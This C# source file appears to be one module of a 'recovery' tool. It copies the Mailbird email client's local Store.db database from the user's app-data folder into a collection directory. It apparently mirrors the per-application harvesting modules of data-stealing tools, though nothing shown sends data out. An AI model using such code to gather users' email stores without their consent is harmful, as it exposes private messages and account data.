using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.EmailClients
{
    public class MailbirdService
    {
        private static readonly string MailbirdFolder = Path.Combine(Common.LocalData, "MailBird");

        public static async Task SaveMailbirdAsync()
        {
            if (!Directory.Exists(MailbirdFolder)) return;

            string mailbirdDbPath = Common.EnsureMailbirdPath();
            string sourceFilePath = Path.Combine(MailbirdFolder, "Store", "Store.db");
            string destFilePath = Path.Combine(mailbirdDbPath, "Store.db");

            await Task.Run(() => CopyFile(sourceFilePath, destFilePath));
        }

        private static void CopyFile(string sourceFilePath, string destFilePath)
        {
            if (!File.Exists(sourceFilePath)) return;

            File.Copy(sourceFilePath, destFilePath, true);
        }
    }
}
